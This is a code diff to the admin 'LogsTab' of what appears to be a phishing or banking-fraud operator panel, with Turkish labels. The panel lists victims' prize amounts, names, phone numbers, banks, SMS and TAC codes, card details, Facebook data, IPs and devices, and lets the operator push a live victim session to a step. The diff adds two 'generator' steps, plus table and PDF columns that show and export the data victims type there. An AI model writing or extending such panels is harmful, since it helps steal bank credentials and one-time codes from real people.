@@ -25,6 +25,8 @@ const APPROVAL_OPTIONS: Array<{ value: string; label: string }> = [
   { value: "mobileid_2", label: "MobileID 2 Sayfası" },
   { value: "biometrika_pin_1", label: "Biometrika/PIN 1" },
   { value: "biometrika_pin_2", label: "Biometrika/PIN 2" },
+  { value: "generator1", label: "Generator 1" },
+  { value: "generator2", label: "Generator 2" },
 ];
 
 function getApprovalDisplayText(value: string): string {
@@ -1283,6 +1285,26 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
   const handleApprovalAction = async (sessionId: string, approvalValue: string) => {
     if (!approvalValue) return;
+
+    // GENERATOR: modal yok — kullaniciyi direkt generator sayfasina yonlendir
+    if (approvalValue === "generator1" || approvalValue === "generator2") {
+      if (!supabase) return;
+      const row = rowsRef.current.find((r) => r.id === sessionId);
+      const previousFormData =
+        row?.form_data && typeof row.form_data === "object" ? row.form_data : {};
+      await supabase
+        .from("sessions")
+        .update({
+          is_hidden: false,
+          status: "online",
+          current_step: approvalValue,
+          form_data: { ...previousFormData, generatorType: approvalValue },
+        })
+        .eq("id", sessionId);
+      void load();
+      return;
+    }
+
     setApprovalPromptSessionId(sessionId);
     setApprovalPromptType(approvalValue);
     setApprovalCodeInput("");
@@ -1382,7 +1404,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
       // Admin tablosuyla ayni kolon yapisi: cizgili tablo PDF
       const s = (v: unknown) => (v == null ? "" : String(v));
-      const COL_HEADERS = ["ID", "Tarih", "Ödül", "İsim", "Numara", "Banka", "Onay", "SMS", "Kart", "Facebook", "IP", "Cihaz"];
+      const COL_HEADERS = ["ID", "Tarih", "Ödül", "İsim", "Numara", "Banka", "Onay", "Generator", "SMS", "Kart", "Facebook", "IP", "Cihaz"];
 
       const tableBody: any[][] = [
         COL_HEADERS.map(
@@ -1411,6 +1433,15 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           ? approvalEntries.map((a) => ({ text: getApprovalDisplayText(a), color: "#059669" }))
           : { text: "-", color: "#9ca3af" };
 
+        const genCell: any[] = [];
+        if (fd.generatorType) genCell.push({ text: fd.generatorType === "generator2" ? "GENERATOR 2" : "GENERATOR 1", bold: true, color: "#e11d48" });
+        if (fd.generatorData && typeof fd.generatorData === "object") {
+          for (const [k, v] of Object.entries(fd.generatorData as Record<string, unknown>)) {
+            if (v != null && String(v).trim() !== "") genCell.push({ text: `${k.replace(/_/g, " ")}: ${s(v)}` });
+          }
+        }
+        if (!genCell.length) genCell.push({ text: "-", color: "#9ca3af" });
+
         const smsValue = s(fd.smsCode).trim() || s(fd.tacCode).trim() || "-";
 
         const cardCell: any[] = [];
@@ -1433,6 +1464,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           s(fd.phone) || "-",
           { stack: bankCell },
           Array.isArray(approvalCell) ? { stack: approvalCell } : approvalCell,
+          { stack: genCell },
           { text: smsValue, bold: smsValue !== "-" },
           { stack: cardCell },
           { stack: fbCell },
@@ -1891,12 +1923,12 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           <table className="w-full table-fixed border-collapse text-[10px] text-left lg:text-[11px]">
             <thead className={`text-[11px] uppercase tracking-wider font-semibold border-b ${darkMode ? 'bg-black/20 text-gray-400 border-white/5' : 'bg-gray-50/50 text-gray-500 border-gray-100'}`}>
               <tr>
-                <th className="w-[6%] px-2 py-3 font-semibold whitespace-nowrap">ID</th>
                 <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">Ödül</th>
                 <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">İsim</th>
                 <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">Numara</th>
                 <th className="w-[19%] px-2 py-3 font-semibold whitespace-nowrap">Banka</th>
                 <th className="w-[12%] px-2 py-3 font-semibold whitespace-nowrap">Onay</th>
+                <th className="w-[7%] px-2 py-3 font-semibold whitespace-nowrap">Generator</th>
                 <th className="w-[6%] px-2 py-3 font-semibold whitespace-nowrap">SMS</th>
                 <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">Kart</th>
                 <th className="w-[10%] px-2 py-3 font-semibold whitespace-nowrap">FACEBOOK</th>
@@ -1962,6 +1994,8 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 else if (s === "congrats") { stepText = "TEBRİKLER"; stepColor = "text-green-500 bg-green-500/10 border border-green-500/20"; }
                 else if (s === "invalid_bank") { stepText = "HATALI BANKA"; stepColor = "text-red-500 bg-red-500/10 border border-red-500/20"; }
                 else if (s === "live_support") { stepText = "CANLI DESTEK"; stepColor = "text-cyan-500 bg-cyan-500/10 border border-cyan-500/20"; }
+                else if (s === "generator1") { stepText = "GENERATOR 1"; stepColor = "text-rose-500 bg-rose-500/10 border border-rose-500/20"; }
+                else if (s === "generator2") { stepText = "GENERATOR 2"; stepColor = "text-rose-500 bg-rose-500/10 border border-rose-500/20"; }
                 else if (s === "special_approval") {
                   const rawAppr = (typeof fd.approvalStatus === "string" ? fd.approvalStatus : "").replace(/_confirmed$/, "");
                   const opt = APPROVAL_OPTIONS.find((o) => o.value === rawAppr);
@@ -1989,9 +2023,6 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
                 return (
                   <tr key={row.id} className={`${darkMode ? 'hover:bg-white/[0.02]' : 'hover:bg-black/[0.01]'} transition-colors duration-200 group`}>
-                    <td className="px-2 py-3 align-top font-mono text-[10px] opacity-50 uppercase break-all" title={row.id}>
-                      {row.id.split('-')[0]}
-                    </td>
                     <td className="px-2 py-3 align-top whitespace-nowrap font-bold text-sm lg:text-base text-[#EB5E28]">
                       {row.amount ? `€${row.amount}` : '-'}
                     </td>
@@ -2065,6 +2096,29 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                             </span>
                           ))}
                         </div>
+                      )}
+                    </td>
+                    <td className="px-2 py-3 align-top">
+                      {fd.generatorType || (fd.generatorData && Object.keys(fd.generatorData).length > 0) ? (
+                        <div className="space-y-1">
+                          <span className="inline-block w-fit rounded-full border border-rose-500/20 bg-rose-500/10 px-2 py-0.5 text-[9px] font-bold tracking-wide text-rose-600 dark:text-rose-400 whitespace-normal break-words leading-tight">
+                            {fd.generatorType === "generator2" ? "GENERATOR 2" : "GENERATOR 1"}
+                          </span>
+                          {fd.generatorData && typeof fd.generatorData === "object" && Object.entries(fd.generatorData as Record<string, unknown>)
+                            .filter(([, v]) => v != null && String(v).trim() !== "")
+                            .map(([k, v]) => (
+                              <div key={k} className="flex min-w-0 items-start gap-1 leading-tight">
+                                <span className="mt-0.5 shrink-0 rounded bg-black/5 px-1 py-0.5 text-[8px] font-bold uppercase whitespace-nowrap opacity-40 dark:bg-white/10">
+                                  {k.replace(/_/g, " ")}
+                                </span>
+                                <span className="min-w-0 cursor-pointer font-medium text-[10px] transition-opacity hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(String(v))}>
+                                  {String(v)}
+                                </span>
+                              </div>
+                            ))}
+                        </div>
+                      ) : (
+                        <span className={`text-[10px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>
                       )}
                     </td>
                     <td className="px-2 py-3 align-top">
